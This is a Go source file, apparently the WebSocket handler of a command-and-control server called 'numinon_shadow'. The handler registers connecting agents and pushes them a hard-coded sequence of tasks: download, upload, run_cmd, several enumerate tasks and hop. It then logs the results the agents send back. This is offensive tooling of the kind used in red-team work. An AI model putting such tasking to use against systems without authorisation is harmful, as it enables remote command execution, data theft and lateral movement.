package router

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"numinon_shadow/internal/tracker"
	"time"
)

var autoPushDelay = time.Second * 6

var counter = 0

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func WSHandler(w http.ResponseWriter, r *http.Request) {
	// UPGRADE from HTTP/1.1 to WebSocket connection
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WebSocket upgrade failed:", err)
		return
	}

	// Extract Agent ID
	agentID := r.Header.Get("Agent-ID")
	if agentID == "" {
		log.Println("Agent connected without an ID")
		return
	}

	defer func() {
		// Mark agent as disconnected when WebSocket closes
		if AgentTracker != nil && agentID != "" {
			AgentTracker.MarkDisconnected(agentID)
		}
		conn.Close()
	}()

	// DETERMINE PROTOCOL
	var agentProtocol config.AgentProtocol

	if r.TLS == nil {
		agentProtocol = config.WebsocketClear
	} else {
		agentProtocol = config.WebsocketSecure
	}

	// Register WebSocket connection
	if AgentTracker != nil {
		listenerID := r.Context().Value("listenerID").(string) // You'll need to set this
		err := AgentTracker.RegisterConnection(
			agentID,
			listenerID,
			string(agentProtocol),
			r.RemoteAddr,
			tracker.TypeWebSocket,
		)
		if err != nil {
			log.Printf("|⚠️ TRACKER| Failed to register WS connection: %v", err)
		}
	}

	log.Printf("| 🧦 WEBSOCKET AGENT CONNECTED | ID: %s | Protocol: %s |\n", agentID, agentProtocol)

	// (4) COMMAND ISSUANCE SIMULATOR (delete this later)

	// Start Tasking Goroutine
	// This goroutine is responsible for proactively pushing tasks to the agent.
	go func() {
		for {
			// 1. Wait for X seconds before attempting to issue a new task.
			time.Sleep(autoPushDelay)

			var response models.ServerTaskResponse

			// For now, just assume there is always a task
			// We will use a counter to go through each command 1-by-1

			response.TaskAvailable = true
			var command string
			var commandArgs json.RawMessage

			switch counter {
			case 0:
				command = "download"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnDownloadStruct(w)
			case 1:
				command = "upload"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnUploadStruct(w)
			case 2:
				command = "run_cmd"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnRunCmdStruct(w)
			case 3:
				command = "enumerate"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnEnumerateStruct(w)
			case 4:
				command = "enumerate"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnEnumerateStruct(w)
			case 5:
				command = "enumerate"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnEnumerateStruct(w)
			case 6:
				command = "enumerate"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnEnumerateStruct(w)
			case 7:
				command = "hop"
				log.Printf("WS Handler Automated Command | Iteration: %d | Command: %s\n", counter, command)
				commandArgs = returnHopStruct(w)

			default:
				return
			}

			// increment so after sleep we call next command
			counter++

			// Create task in task manager
			task, err := TaskManager.CreateTask(agentID, command, commandArgs)
			if err != nil {
				log.Printf("|❗ERR TASK| Failed to create task: %v", err)
				http.Error(w, "Failed to create task", http.StatusInternalServerError)
				return
			}

			// Use orchestrator to prepare the task (sets metadata, validates args, etc.)
			if err := Orchestrators.PrepareTask(task); err != nil {
				log.Printf("|❗ERR TASK| Failed to prepare task: %v", err)
				http.Error(w, "Failed to prepare task", http.StatusInternalServerError)
				return
			}

			// Update task with any metadata set by the orchestrator
			if err := TaskManager.UpdateTask(task); err != nil {
				log.Printf("|❗WARN TASK| Failed to update task after preparation: %v", err)
				// Continue anyway - task was created
			}

			// Populate response with task details
			response.TaskID = task.ID
			response.Command = task.Command
			response.Data = task.Arguments

			// Mark task as dispatched
			if err := TaskManager.MarkDispatched(task.ID); err != nil {
				log.Printf("|❗WARN TASK| Failed to mark task as dispatched: %v", err)
				// Continue anyway - task was created and sent
			}

			log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s (WebSocket)\n",
				response.Command, response.TaskID, agentID)

			// 3. Marshal the response struct to JSON.
			jsonResponse, err := json.Marshal(response)
			if err != nil {
				log.Printf("Error marshalling task for Agent %s: %v", agentID, err)
				continue // Skip this iteration on error
			}

			// 4. Write the JSON message to the WebSocket connection.
			if err := conn.WriteMessage(websocket.TextMessage, jsonResponse); err != nil {
				log.Printf("Error sending task to Agent %s: %v", agentID, err)
				// If we can't write, the connection is likely broken. Exit the goroutine.
				return
			}
		}
	}()
	// --------------------------------------------------------------------------

	// (5) READING LOOP - Reading messages FROM the agent (e.g., task results)
	for {
		// ReadMessage is a blocking call. It will wait here for the agent to send a message.
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Printf("AGENT DISCONNECTED: %s. Reason: %v", agentID, err)
			break // Exit the loop if the connection is closed or an error occurs.
		}

		log.Printf("Received message of type %d from Agent %s: %s", messageType, agentID, string(p))

		// Process the received message from the agent.
		if messageType == websocket.TextMessage || messageType == websocket.BinaryMessage {
			procErr := wsProcessIncomingMessage(conn, agentID, agentProtocol, p)
			if procErr != nil {
				log.Printf("|❗ERR WS HANDLER| AgentID: %s - Error processing incoming message: %v. Continuing read loop.", agentID, procErr)
			}
		}
	}
}

func wsProcessIncomingMessage(conn *websocket.Conn, agentID string, agentProtocol config.AgentProtocol, p []byte) error {
	log.Printf("|_DBG WS HANDLER| AgentID: %s - Processing message (%d bytes)", agentID, len(p))

	// 1. Unmarshal the raw JSON into our AgentTaskResult struct
	var result models.AgentTaskResult
	if err := json.Unmarshal(p, &result); err != nil {
		log.Printf("|❗ERR RESULT|-> Error unmarshaling result JSON from agent %s: %v\n", agentID, err)
		return fmt.Errorf("Error unmarshaling result JSON from agent %s: %v", agentID, err)
	}

	// Create a temporary struct for logging so we can display output as a string
	prettyResult := struct {
		TaskID string `json:"task_id"`
		Status string `json:"status"`
		Output string `json:"output"` // Changed to string for display
		Error  string `json:"error"`
	}{
		TaskID: result.TaskID,
		Status: result.Status,
		Output: string(result.Output), // Convert byte slice to string here
		Error:  result.Error,
	}

	// 2. Re-marshal the struct into a "pretty" indented JSON string
	prettyJSON, err := json.MarshalIndent(prettyResult, "", "  ") // Using two spaces for indentation
	if err != nil {
		log.Printf("|❗ERR RESULT|-> Error re-marshaling for pretty printing: %v\n", err)
	}
	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s\n--- Task Result ---\n%s\n-------------------\n", agentID, string(prettyJSON))

	// --- PRETTY PRINT LOGIC ENDS HERE ---

	// Notify task broker
	if TaskBroker != nil {
		if err := TaskBroker.ProcessAgentResult(result); err != nil {
			log.Printf("|⚠️ RESULT| Failed to notify task broker: %v", err)
			// Don't fail the request - broker notification is not critical
		}
	}

	return nil
}
